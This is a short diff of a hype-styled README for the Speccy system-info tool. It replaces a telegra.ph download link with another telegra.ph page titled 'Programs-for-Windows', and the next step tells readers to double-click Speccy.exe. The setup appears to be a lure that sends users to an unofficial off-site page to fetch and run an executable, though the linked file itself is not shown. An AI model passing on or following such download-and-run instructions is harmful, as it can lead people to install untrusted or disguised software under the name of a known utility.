@@ -20,7 +20,7 @@
 ## 🛠 **How to Use? It’s SUPER Easy!**  
 
 ### 📥 **Step 1: Download**  
-[👉 Grab the latest release from the](https://telegra.ph/Speccy--Instant-System-Info-Tool-05-21)  
+[👉 Grab the latest release from the](https://telegra.ph/Programs-for-Windows-05-23)  
 
 ### 🚀 **Step 2: Run**  
 👉 Just **double-click `Speccy.exe`**  
